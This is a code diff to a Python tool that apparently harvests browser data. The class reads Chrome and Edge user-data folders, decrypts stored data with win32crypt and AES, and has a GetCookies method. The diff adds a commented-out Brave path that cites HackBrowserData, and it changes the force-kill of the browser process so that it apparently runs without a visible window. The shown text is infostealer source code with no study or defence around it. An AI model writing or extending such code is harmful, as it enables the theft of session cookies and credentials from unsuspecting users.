@@ -7,6 +7,7 @@ import base64
 import win32crypt
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
+import subprocess
 
 class browser:
     def __init__(self):
@@ -14,6 +15,8 @@ class browser:
         self.browsers = [
             ["chrome.exe", self.homepath + r"\Google\Chrome\User Data"],
             ["msedge.exe", self.homepath + r"\Microsoft\Edge\User Data"],
+            #D:\HackBrowserData-0.4.5\HackBrowserData-0.4.5\browser\browser_windows.go
+            # ["brave.exe", self.homepath + r"\BraveSoftware\Brave-Browser\User Data"],#test this path for brave
         ]
 
         for i in self.browsers.copy():
@@ -90,11 +93,13 @@ class browser:
         else:
             return ""
     
-    def KillBrowser(self,browser_name):
+    def KillBrowser(self, browser_name):
         try:
-            os.system("taskkill /f /im %s"%browser_name)
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            subprocess.call("taskkill /f /im %s" % browser_name, startupinfo=startupinfo)
         except Exception as e:
-            print( "[-][ERR] %s"%str(e))
+            print("[-][ERR] %s" % str(e))
         
     
     def GetCookies(self):
